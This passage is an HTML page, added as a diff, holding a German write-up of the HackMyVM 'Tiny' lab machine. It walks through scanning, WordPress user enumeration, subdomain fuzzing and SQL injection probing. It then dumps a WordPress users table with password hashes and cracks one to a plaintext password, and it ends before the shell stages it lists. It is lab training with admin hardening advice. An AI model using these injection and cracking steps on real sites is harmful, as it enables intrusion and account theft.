@@ -1,0 +1,965 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tiny - HackMyVM - Bericht</title> <!-- Titel angepasst -->
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css"> <!-- Pfad ggf. anpassen -->
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ <div class="nav-wrapper">
+    <div class="hamburger-nav-wrapper">
+        <input type="checkbox" id="hamburger-toggle">
+        <label id="hamburger-button" for="hamburger-toggle" aria-label="Menü öffnen">
+            <div class="bar"></div>
+            <div class="bar"></div>
+            <div class="bar"></div>
+        </label>
+
+        <nav class="navbar" id="main-nav">
+            <a href="../../aboutme.html">Über mich</a> <!-- Pfad ggf. anpassen -->
+            <a href="../../index.html">HackMyVM</a> <!-- Pfad ggf. anpassen -->
+            <a href="../../vulnyx.html">Vulnyx</a> <!-- Pfad ggf. anpassen -->
+            <a href="../../vulnhub.html">Vulnhub</a> <!-- Pfad ggf. anpassen -->
+        </nav>
+  </div></div>
+    <div class="header-bg">
+        <!-- Titel und Schwierigkeitsgrad angepasst -->
+        <h1>Tiny - HackMyVM - Level: Hard - Bericht</h1>
+        <div class="level-container">
+            <!-- Klasse für Hard gesetzt -->
+            <h2 class="level-hard">Hard</h2>
+            <div class="circle">
+                <!-- Farben werden durch CSS für .level-hard gesteuert -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                 <!-- Liste der verwendeten Tools basierend auf dem Text -->
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">vi</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">dirb</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">wpscan</div>
+                <div class="tool-item">wfuzz</div>
+                <div class="tool-item">sqlmap (implizit)</div>
+                <div class="tool-item">john</div>
+                <div class="tool-item">searchsploit (implizit)</div>
+                <div class="tool-item">python</div>
+                <div class="tool-item">msfconsole</div>
+                <div class="tool-item">meterpreter</div>
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">head</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">cd</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">getcap</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">grep</div>
+                <div class="tool-item">tinyproxy (Service)</div>
+                <div class="tool-item">socat</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">cp</div>
+                <div class="tool-item">chmod</div>
+                <div class="tool-item">id</div>
+                <div class="tool-item">bash</div>
+                <div class="tool-item">zsh (lokal)</div>
+             </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                 <!-- Inhaltsverzeichnis angepasst -->
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a>
+                    <ul>
+                        <li><a href="#enum-http80">Port 80 (Apache/WordPress)</a></li>
+                        <li><a href="#enum-proxy">Port 8888 (tinyproxy)</a></li>
+                        <li><a href="#enum-subdomain">Subdomain Enumeration (wish.tiny.hmv)</a></li>
+                        <li><a href="#enum-sqli">SQL Injection auf wish.tiny.hmv</a></li>
+                        <li><a href="#enum-hashcrack">Hash Cracking (WordPress Users)</a></li>
+                    </ul>
+                </li>
+                <li><a href="#initial-access">Initial Access (POC - WordPress RCE)</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a>
+                    <ul>
+                        <li><a href="#privesc-www-data-enum">Enumeration als www-data</a></li>
+                        <li><a href="#privesc-proxy-bypass">Proxy Bypass & SSH Key Leak (vic)</a></li>
+                        <li><a href="#privesc-vic-shell">Shell als vic</a></li>
+                        <li><a href="#privesc-root-carpy">POC: Eskalation zu root (sudo car.py)</a></li>
+                    </ul>
+                </li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+<span class="command">192.168.2.118	08:00:27:42:ac:b4	PCS Systemtechnik GmbH</span>
+                    </pre>
+                </div>
+            </div>
+             <p class="analysis">
+                **Analyse:** Mit `arp-scan -l` wird das lokale Netzwerk nach aktiven Hosts durchsucht. Ein Host mit der IP `192.168.2.118` und der MAC `08:00:27:42:ac:b4` (VirtualBox OUI) wird gefunden.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Das Zielsystem wurde identifiziert. IP-Adresse ist `192.168.2.118`.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Nmap-Scan auf `192.168.2.118` durchführen.<br>
+                **Empfehlung (Admin):** Netzwerk-Monitoring zur Erkennung unbekannter Geräte.
+            </p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">vi /etc/hosts</span></div>
+                     <pre>
+<span class="comment"># Eintrag hinzugefügt:</span>
+127.0.0.1	localhost
+<span class="command">192.168.2.118   tiny.hmv</span>
+                    </pre>
+                 </div>
+            </div>
+             <p class="analysis">
+                **Analyse:** Der Hostname `tiny.hmv` wird lokal auf die IP des Zielsystems gemappt.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Standardvorgehen zur Vereinfachung der Ansprache, insbesondere bei Webanwendungen.
+            </p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sV -A -T5 192.168.2.118 -p- | grep open</span></div>
+                     <pre>
+<span class="command">22/tcp   open  ssh        OpenSSH 9.2p1 Debian 2 (protocol 2.0)</span>
+<span class="command">80/tcp   open  http       Apache httpd 2.4.57 ((Debian))</span>
+<span class="command">8888/tcp open  http-proxy tinyproxy 1.11.1</span>
+                    </pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sV -A -T5 192.168.2.118 -p-</span></div>
+                      <pre>
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-08 16:06 CET
+Nmap scan report for tiny.hmv (<span class="command">192.168.2.118</span>)
+Host is up (0.00031s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT     STATE SERVICE    VERSION
+<span class="command">22/tcp   open  ssh        OpenSSH 9.2p1 Debian 2 (protocol 2.0)</span>
+| ssh-hostkey: [...]
+<span class="command">80/tcp   open  http       Apache httpd 2.4.57 ((Debian))</span>
+| http-robots.txt: 15 disallowed entries
+| /wp-admin/ /cgi-bin/ /private/ /temp/ /backup/ /old/
+| /test/ /dev/ / /misc/ /downloads/ /doc/ /documents/
+|_/restricted/ /confidential/
+|_http-server-header: Apache/2.4.57 (Debian)
+|_http-title: Blog
+|_http-generator: <span class="password">WordPress 6.4.2</span>
+<span class="command">8888/tcp open  http-proxy tinyproxy 1.11.1</span>
+|_http-server-header: tinyproxy/1.11.1
+|_http-title: 403 Access denied
+MAC Address: 08:00:27:42:AC:B4 (Oracle VirtualBox virtual NIC)
+[...]
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+[...]
+                    </pre>
+                 </div>
+             </div>
+              <p class="analysis">
+                 **Analyse:** Nmap-Scans identifizieren drei offene Ports:
+                 *   **Port 22 (SSH):** OpenSSH 9.2p1 (Debian). Aktuelle Version.
+                 *   **Port 80 (HTTP):** Apache 2.4.57 (Debian), der eine WordPress 6.4.2 Seite mit dem Titel "Blog" hostet. Die `robots.txt` listet viele Standard- und einige potenziell interessante Verzeichnisse auf, die gesperrt sind.
+                 *   **Port 8888 (HTTP Proxy):** tinyproxy 1.11.1. Gibt "403 Access denied" zurück, was bedeutet, dass der Proxy Anfragen vom Angreifer-System nicht erlaubt.
+             </p>
+             <p class="evaluation">
+                 **Bewertung:** Das Hauptziel ist die WordPress-Seite auf Port 80. Die `robots.txt` gibt Hinweise auf zu untersuchende (oder zu vermeidende) Pfade. Der tinyproxy auf Port 8888 ist interessant, aber momentan nicht direkt zugänglich. SSH benötigt Credentials.
+            </p>
+             <p class="recommendation">
+                 **Empfehlung (Pentester):**
+                 1.  **WordPress (Port 80):** Mit `wpscan` oder manuell nach Benutzern, Plugins, Themes und Schwachstellen suchen. Die in `robots.txt` genannten Pfade besonders beachten (oder ignorieren, je nach Zielsetzung).
+                 2.  **Tinyproxy (Port 8888):** Konfiguration suchen (evtl. über LFI/RCE auf Port 80 zugänglich), um die erlaubten IPs oder mögliche Schwachstellen in tinyproxy 1.11.1 zu finden.
+                 3.  **SSH (Port 22):** Zurückstellen.<br>
+                 **Empfehlung (Admin):**
+                 1.  **WordPress:** Aktuell halten, nicht benötigte Plugins/Themes entfernen, starke Passwörter verwenden, Benutzerrechte minimieren. `robots.txt` sinnvoll gestalten (keine sensiblen Pfade verstecken, die serverseitig geschützt sein sollten).
+                 2.  **Tinyproxy:** Zugriff auf den Proxy nur für autorisierte Clients/Netzwerke erlauben. Proxy aktuell halten. Logging aktivieren.
+                 3.  **Apache/SSH:** Standard-Härtung.
+             </p>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+
+             <h3 id="enum-http80">Port 80 (Apache/WordPress)</h3>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nikto -h 192.168.2.118</span></div>
+                     <pre>
+- Nikto v2.5.0
+[...]
++ Target IP:          192.168.2.118
+[...]
++ Server: Apache/2.4.57 (Debian)
++ /: The anti-clickjacking X-Frame-Options header is not present. [...]
++ /: Drupal Link header found with value: <http://tiny.hmv/index.php?rest_route=/>; rel="https://api.w.org/". [...] <span class="comment">(False Positive, ist WordPress)</span>
++ /: The X-Content-Type-Options header is not set. [...]
++ /index.php?: Uncommon header 'x-redirect-by' found, with contents: WordPress.
++ /robots.txt: contains 18 entries which should be manually viewed. [...]
++ /: Web Server returns a valid response with junk HTTP methods [...]
++ /cgi-bin/: CGI Directory found. [...]
++ /wp-content/plugins/akismet/readme.txt: The WordPress Akismet plugin 'Tested up to' version usually matches the WordPress version.
++ /wp-links-opml.php: This WordPress script reveals the installed version.
++ /license.txt: License file found may identify site software.
++ /: A Wordpress installation was found.
++ /wp-login.php?action=register: Cookie wordpress_test_cookie created without the httponly flag. [...]
++ /wp-content/uploads/: Directory indexing found.
++ /wp-content/uploads/: Wordpress uploads directory is browsable. [...]
++ /wp-login.php: Wordpress login found.
+[...]
++ 1 host(s) tested
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis">
+                 **Analyse:** `nikto` wird auf Port 80 ausgeführt. Es identifiziert den Apache-Server und bestätigt die WordPress-Installation. Es meldet mehrere Standard-Findings für WordPress und Webserver-Konfigurationen:
+                 *   Fehlende Sicherheitsheader (`X-Frame-Options`, `X-Content-Type-Options`).
+                 *   Vorhandensein von `robots.txt`, `license.txt`, `readme.txt`.
+                 *   Standard-WordPress-Pfade (`/wp-login.php`, `/wp-content/uploads/`, `/cgi-bin/`).
+                 *   Directory Indexing für `/wp-content/uploads/`.
+                 *   Ein Cookie ohne `HttpOnly`-Flag.
+                 Die Drupal-Header-Meldung ist wahrscheinlich ein False Positive.
+             </p>
+             <p class="evaluation">
+                 **Bewertung:** Bestätigt die WordPress-Installation und hebt einige allgemeine Konfigurationspunkte hervor. Das Directory Indexing für `/wp-content/uploads/` ist interessant, da es das Durchsuchen hochgeladener Dateien ermöglicht. Keine kritischen Schwachstellen direkt durch Nikto gefunden.
+             </p>
+             <p class="recommendation">
+                **Empfehlung (Pentester):** Das `/wp-content/uploads/`-Verzeichnis manuell durchsuchen. Die fehlenden Sicherheitsheader zur Kenntnis nehmen. WPScan für detailliertere WordPress-Analyse verwenden.<br>
+                **Empfehlung (Admin):** Sicherheitsheader (`X-Frame-Options`, `X-Content-Type-Options`, `Content-Security-Policy` etc.) implementieren. Directory Indexing für `/wp-content/uploads/` und andere Verzeichnisse deaktivieren. Cookies mit `HttpOnly`- und `Secure`-Flags versehen.
+            </p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">dirb http://tiny.hmv/</span></div>
+                     <pre>
+[...]
++ http://tiny.hmv/index.php (CODE:301|SIZE:0)
+==> DIRECTORY: http://tiny.hmv/javascript/
++ http://tiny.hmv/robots.txt (CODE:200|SIZE:815)
++ http://tiny.hmv/server-status (CODE:403|SIZE:273)
+==> DIRECTORY: http://tiny.hmv/wp-admin/
+==> DIRECTORY: http://tiny.hmv/wp-content/
+==> DIRECTORY: http://tiny.hmv/wp-includes/
++ http://tiny.hmv/xmlrpc.php (CODE:405|SIZE:42)
+[...]
+---- Entering directory: http://tiny.hmv/wp-admin/ ----
+[...]
+---- Entering directory: http://tiny.hmv/wp-content/ ----
+[...]
+---- Entering directory: http://tiny.hmv/wp-includes/ ----
+[...]
+                     </pre>
+                 </div>
+            </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://tiny.hmv -x txt,php,[...] -w "/usr/share/seclists/[...]" -b '403,404' -e --no-error -k</span></div>
+                     <pre>
+[...]
+http://tiny.hmv/index.php            (Status: 301) [Size: 0] [--> http://tiny.hmv/]
+http://tiny.hmv/wp-content           (Status: 301) [Size: 309] [--> http://tiny.hmv/wp-content/]
+http://tiny.hmv/license.txt          (Status: 200) [Size: 19915]
+http://tiny.hmv/wp-login.php         (Status: 200) [Size: 5714]
+http://tiny.hmv/wp-includes          (Status: 301) [Size: 310] [--> http://tiny.hmv/wp-includes/]
+http://tiny.hmv/javascript           (Status: 301) [Size: 309] [--> http://tiny.hmv/javascript/]
+http://tiny.hmv/readme.html          (Status: 200) [Size: 7399]
+http://tiny.hmv/robots.txt           (Status: 200) [Size: 815]
+http://tiny.hmv/wp-trackback.php     (Status: 200) [Size: 135]
+http://tiny.hmv/wp-admin             (Status: 301) [Size: 307] [--> http://tiny.hmv/wp-admin/]
+http://tiny.hmv/xmlrpc.php           (Status: 405) [Size: 42]
+http://tiny.hmv/wp-signup.php        (Status: 302) [Size: 0] [--> http://tiny.hmv/wp-login.php?action=register]
+[...]
+                    </pre>
+                 </div>
+             </div>
+             <p class="analysis">
+                **Analyse:** Sowohl `dirb` als auch `gobuster` werden zur Verzeichniserkennung eingesetzt. Sie finden die erwarteten WordPress-Standardpfade (`/wp-admin`, `/wp-content`, `/wp-includes`), die Login-Seite (`/wp-login.php`), Registrierungsseite (`/wp-signup.php`), `xmlrpc.php`, `robots.txt`, `readme.html`, `license.txt` etc. `/server-status` ist vorhanden, aber nicht zugänglich (403).
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Bestätigt die WordPress-Struktur. Keine ungewöhnlichen oder direkt ausnutzbaren Pfade gefunden. Die Registrierung scheint aktiviert zu sein (`wp-signup.php` leitet dorthin um).
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** WPScan für gezielte WordPress-Enumeration (Benutzer, Plugins, Themes, Version) verwenden.<br>
+                **Empfehlung (Admin):** Den Zugriff auf `/server-status` korrekt konfigurieren oder deaktivieren. Die Benutzerregistrierung deaktivieren, falls nicht benötigt. `xmlrpc.php` deaktivieren, wenn es nicht verwendet wird, da es oft für Brute-Force- oder DDoS-Angriffe missbraucht wird.
+            </p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+# <span class="command">Manuelle Prüfung von http://tiny.hmv/?p=1</span>
+Published 30 September 2023 By <span class="command">admin</span>
+                    </pre>
+                 </div>
+            </div>
+             <p class="analysis">
+                **Analyse:** Das manuelle Aufrufen eines Posts (`/?p=1`) zeigt, dass der Autor der Benutzer `admin` ist.
+            </p>
+            <p class="evaluation">
+                 **Bewertung:** Bestätigt den Benutzernamen `admin`.
+            </p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wpscan --url http://tiny.hmv -e u --api-token RoBo...Y</span></div>
+                     <pre>
+[...]
+[i] User(s) Identified:
+
+[+] <span class="command">admin</span>
+ | Found By: Author Posts - Display Name (Passive Detection)
+[...]
+[+] <span class="command">umeko</span>
+ | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+[...]
+[i] No plugins Found.
+[...]
+[i] No Config Backups Found.
+[...]
+                     </pre>
+                 </div>
+            </div>
+             <p class="analysis">
+                **Analyse:** WPScan wird zur Benutzerenumeration (`-e u`) ausgeführt. Es identifiziert erfolgreich die Benutzer `admin` und `umeko`. Es werden keine Plugins oder Konfigurations-Backups gefunden.
+            </p>
+             <p class="evaluation">
+                **Bewertung:** Zwei gültige Benutzernamen (`admin`, `umeko`) sind nun bekannt. Da keine verwundbaren Plugins/Themes gefunden wurden, ist der nächste logische Schritt ein Passwort-Angriff auf diese Benutzer.
+            </p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <pre>
+<span class="comment"># WPScan Brute-Force Versuch auf umeko (abgebrochen)</span>
+[+] Performing password attack on Wp Login against 1 user/s
+[...] Trying umeko / samantha [...]
+[...] Trying umeko / brandon [...]
+^C [...]
+Scan Aborted: Canceled by User
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis">
+                **Analyse:** Ein WPScan-Passwortangriff auf den Benutzer `umeko` mit einer Wortliste wird gestartet, aber vom Benutzer abgebrochen (`^C`).
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Der Brute-Force-Versuch auf `umeko` war (zumindest in diesem Log) nicht erfolgreich.
+            </p>
+
+             <h3 id="enum-proxy">Port 8888 (tinyproxy)</h3>
+             <div class="code-block">
+                 <div class="terminal">
+                      <pre>
+# <span class="command">Manuelle Prüfung von http://tiny.hmv:8888/</span>
+Access denied
+The administrator of this proxy has not configured it to service requests from your host.
+Generated by tinyproxy version 1.11.1.
+                     </pre>
+                 </div>
+            </div>
+             <p class="analysis">
+                 **Analyse:** Der direkte Zugriff auf den tinyproxy auf Port 8888 wird verweigert, da die IP des Angreifers nicht in der Konfiguration erlaubt ist.
+             </p>
+             <p class="evaluation">
+                 **Bewertung:** Der Proxy ist für den direkten Angriff von außen nicht nutzbar. Er könnte jedoch von intern (z.B. aus einer Webshell) genutzt werden, um auf Dienste zuzugreifen, die nur auf localhost lauschen, oder um die Konfiguration auf Schwachstellen zu prüfen.
+            </p>
+
+            <h3 id="enum-subdomain">Subdomain Enumeration (wish.tiny.hmv)</h3>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u "http://tiny.hmv" -H "Host: FUZZ.tiny.hmv" --hh 24171 --hc "404"</span></div>
+                     <pre>
+[...]
+Target: http://tiny.hmv/
+[...]
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+000000001:   301        0 L      0 W        0 Ch        "www"
+<span class="password">000006244:   200        68 L     132 W      1821 Ch     "wish"</span>
+[...]
+                     </pre>
+                 </div>
+            </div>
+              <p class="analysis">
+                 **Analyse:** `wfuzz` wird für Virtual Host Discovery verwendet (Fuzzing des Host-Headers). Es findet eine Subdomain `wish.tiny.hmv`, die eine andere Antwort (Status 200, 1821 Chars) liefert als die Hauptdomain (deren Größe mit `--hh 24171` ausgeblendet wird).
+             </p>
+             <p class="evaluation">
+                 **Bewertung:** Kritischer Fund! Eine zusätzliche Webanwendung läuft unter `wish.tiny.hmv`. Diese muss separat untersucht werden.
+             </p>
+              <p class="recommendation">
+                 **Empfehlung (Pentester):**
+                 1.  Den Hostnamen `wish.tiny.hmv` zur lokalen `/etc/hosts`-Datei hinzufügen.
+                 2.  Die Seite `http://wish.tiny.hmv` im Browser untersuchen und auf Schwachstellen prüfen.<br>
+                 **Empfehlung (Admin):** Nicht benötigte Subdomains/virtuelle Hosts deaktivieren. Sicherstellen, dass alle Webanwendungen, auch auf Subdomains, sicher konfiguriert und gepatcht sind.
+             </p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                      <pre>
+# <span class="command">Manuelle Prüfung von http://wish.tiny.hmv/</span>
+# Quellcode zeigt Formular:
+form method="post" action="/index.php"
+    <label for="username">Username:</label><br>
+    input type="text" id="username" name="username"<br>
+    <label for="wish">Your wish:</label><br>
+    <textarea id="wish" name="wish"></textarea><br>
+    input type="submit" value="Soumettre"
+form
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis">
+                **Analyse:** Die Seite `wish.tiny.hmv` enthält ein einfaches Formular mit Feldern für "Username" und "Your wish", das Daten per POST an `/index.php` sendet.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Ein einfacher Mechanismus zur Dateneingabe. Die Parameter `username` und `wish` sind potenzielle Eintrittspunkte für Angriffe wie SQL Injection oder Cross-Site Scripting (XSS).
+            </p>
+
+            <h3 id="enum-sqli">SQL Injection auf wish.tiny.hmv</h3>
+             <div class="code-block">
+                 <div class="terminal">
+                      <pre>
+# <span class="command">POST Request 1 (Normal)</span>
+PST /index.php HTTP/1.1
+Host: wish.tiny.hmv
+[...]
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 25
+
+username=admin&wish=admin
+
+# <span class="command">Response 1 (Normal)</span>
+HTTP/1.1 200 OK
+[...]
+Content-Type: text/html; charset=UTF-8
+[...]
+    Your wish will soon come true !
+[...]
+
+# <span class="command">POST Request 2 (Mit Apostroph)</span>
+PST /index.php HTTP/1.1
+Host: wish.tiny.hmv
+[...]
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 25
+
+username=admin<span class="password">'</span>&wish=admin
+
+# <span class="command">Response 2 (Fehler -> SQLi wahrscheinlich)</span>
+HTTP/1.0 500 Internal Server Error
+Date: Fri, 08 Dec 2023 15:34:32 GMT
+Server: Apache/2.4.57 (Debian)
+Content-Length: 0
+Connection: close
+Content-Type: text/html; charset=UTF-8
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis">
+                **Analyse:** Zwei POST-Anfragen an `/index.php` auf `wish.tiny.hmv` werden gezeigt. Die erste Anfrage mit normalen Daten (`username=admin&wish=admin`) erhält eine normale "200 OK"-Antwort. Die zweite Anfrage fügt ein Apostroph zum `username`-Parameter hinzu (`username=admin'`). Diese Anfrage führt zu einem "500 Internal Server Error".
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Das unterschiedliche Verhalten bei der Eingabe eines Apostrophs ist ein klassischer Indikator für eine SQL-Injection-Schwachstelle im `username`-Parameter. Das Backend versucht wahrscheinlich, den Benutzernamen direkt in eine SQL-Abfrage einzufügen, was durch das Apostroph zu einem Syntaxfehler führt.
+            </p>
+             <p class="recommendation">
+                **Empfehlung (Pentester):** Die SQL-Injection-Schwachstelle mit Tools wie `sqlmap` bestätigen und ausnutzen, um Datenbankinformationen (Version, Datenbanken, Tabellen, Benutzer, Hashes) zu extrahieren.<br>
+                **Empfehlung (Admin):** Die SQL-Injection-Schwachstelle in `/index.php` auf `wish.tiny.hmv` dringend beheben. Parametrisierte Abfragen (Prepared Statements) verwenden, um SQL-Injection zu verhindern. Benutzereingaben immer validieren und sanitisieren.
+            </p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+# <span class="command">Ausgabe von SQLMap / manueller SQLi (Datenbank-Dump)</span>
+
+Database: wish_db
+Table: wishs
+[17 entries]
++----+---------------+-------------------------------------+
+| id | wish          | username                            |
++----+---------------+-------------------------------------+
+| 1  | admin\r\n\r\n | admin                               |
+[...]
+| 14 | admin         | admin);SELECT PG_SLEEP(5)--         | <span class="comment"># Time-based SQLi Test</span>
+| 15 | admin         | admin;SELECT PG_SLEEP(5)--          | <span class="comment"># Time-based SQLi Test</span>
+[...]
++----+---------------+-------------------------------------+
+
+<span class="comment"># Dump der Tabellen aus einer anderen Datenbank (wordpressdb)</span>
++----------------------------------+
+| Tables_in_wordpressdb            |
++----------------------------------+
+| wp_commentmeta                   |
+| wp_comments                      |
+[...]
+| wp_users                         |
++----------------------------------+
+
+<span class="comment"># Dump der wp_users Tabelle</span>
+MariaDB [wordpressdb]> select * from wp_users;
++----+------------+------------------------------------+---------------+-----------------+-----------------+---------------------+---------------------+-------------+--------------+
+| ID | user_login | user_pass                          | user_nicename | user_email      | user_url        | user_registered     | user_activation_key | user_status | display_name |
++----+------------+------------------------------------+---------------+-----------------+-----------------+---------------------+---------------------+-------------+--------------+
+|  1 | <span class="command">admin</span>      | <span class="password">$P$BwfekymguhBDZWjj2dtDbAFxaT6Y61</span> | admin         | admin@gmail.com | http://tiny.hmv | 2023-09-30 06:23:59 |                     |           0 | admin        |
+|  2 | <span class="command">umeko</span>      | <span class="password">$P$Bvgq8e/R0VX2mXzClIq1Acj39KCAp1</span> | umeko         | umeko@gmail.com |                 | 2023-09-30 06:29:14 |                     |           0 | umeko        |
++----+------------+------------------------------------+---------------+-----------------+-----------------+---------------------+---------------------+-------------+--------------+
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis">
+                **Analyse:** Die SQL-Injection-Schwachstelle wird ausgenutzt (vermutlich mit `sqlmap`), um Datenbankinhalte zu extrahieren.
+                *   Die Datenbank `wish_db` mit der Tabelle `wishs` wird gefunden. Die darin enthaltenen Daten zeigen frühere SQLi-Versuche (z.B. `PG_SLEEP(5)` für PostgreSQL Time-based SQLi, obwohl der Server MariaDB/MySQL zu sein scheint).
+                *   Entscheidend: Es gelingt, auf eine *andere* Datenbank namens `wordpressdb` zuzugreifen und die Tabelle `wp_users` zu dumpen. Dies deutet darauf hin, dass der Datenbankbenutzer, der von `wish.tiny.hmv` verwendet wird, auch Leserechte auf die WordPress-Datenbank hat.
+                *   Die `wp_users`-Tabelle enthält die Benutzernamen `admin` und `umeko` sowie ihre Passwort-Hashes (`$P$...` -> phpass).
+            </p>
+             <p class="evaluation">
+                **Bewertung:** Dies ist ein kritischer Erfolg. Die SQLi ermöglichte nicht nur den Zugriff auf die `wish_db`, sondern auch auf die WordPress-Benutzerdatenbank, wodurch die Passwort-Hashes der WP-Benutzer extrahiert werden konnten.
+            </p>
+              <p class="recommendation">
+                 **Empfehlung (Pentester):** Die extrahierten phpass-Hashes für `admin` und `umeko` mit `john` oder `hashcat` versuchen zu knacken.<br>
+                 **Empfehlung (Admin):**
+                 1.  SQL-Injection auf `wish.tiny.hmv` beheben.
+                 2.  Datenbankberechtigungen überprüfen und nach dem Prinzip der geringsten Rechte vergeben. Der Benutzer für `wish_db` sollte keine Leserechte auf `wordpressdb` haben. Jede Anwendung sollte ihren eigenen, dedizierten Datenbankbenutzer mit minimal notwendigen Rechten haben.
+                 3.  Passwörter für `admin` und `umeko` ändern.
+             </p>
+
+            <h3 id="enum-hashcrack">Hash Cracking (WordPress Users)</h3>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">echo '$P$Bvgq8e/R0VX2mXzClIq1Acj39KCAp1' > hash</span></div> <span class="comment"># Hash für umeko</span>
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">john --wordlist=/usr/share/wordlists/rockyou.txt hash</span></div>
+                     <pre>
+[...]
+<span class="password">fuckit!</span>          (?) <span class="comment"># Passwort für umeko</span>
+[...]
+Session completed.
+                     </pre>
+                 </div>
+            </div>
+            <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">echo '$P$BwfekymguhBDZWjj2dtDbAFxaT6Y61' > hash</span></div> <span class="comment"># Hash für admin</span>
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">john --wordlist=/usr/share/wordlists/rockyou.txt hash</span></div>
+                     <pre>
+[...]
+0g 0:00:01:25 DONE (2023-12-08 17:05) 0g/s 166854p/s 166854c/s 166854C/s !!shmoo_50!!..*7¡Vamos!
+Session completed. <span class="comment"># Kein Passwort gefunden</span>
+                     </pre>
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">john hash --show</span></div>
+                      <pre>0 password hashes cracked, 1 left</pre>
+                 </div>
+            </div>
+            <p class="analysis">
+                 **Analyse:** Die beiden extrahierten phpass-Hashes werden mit `john` und `rockyou.txt` angegriffen.
+                 *   Der Hash für `umeko` wird erfolgreich geknackt: Das Passwort lautet `fuckit!`.
+                 *   Der Hash für `admin` kann mit dieser Wortliste nicht geknackt werden.
+            </p>
+            <p class="evaluation">
+                 **Bewertung:** Das Passwort für `umeko` ist bekannt. Dies ermöglicht den Login in das WordPress-Backend als `umeko`. Der `admin`-Account bleibt vorerst unzugänglich.
+            </p>
+            <p class="recommendation">
+                 **Empfehlung (Pentester):** Sich als `umeko` mit dem Passwort `fuckit!` im WordPress-Adminbereich (`/wp-admin/`) anmelden und nach Möglichkeiten suchen, Code auszuführen oder weitere Rechte zu erlangen (z.B. Plugin-/Theme-Upload/Editor).<br>
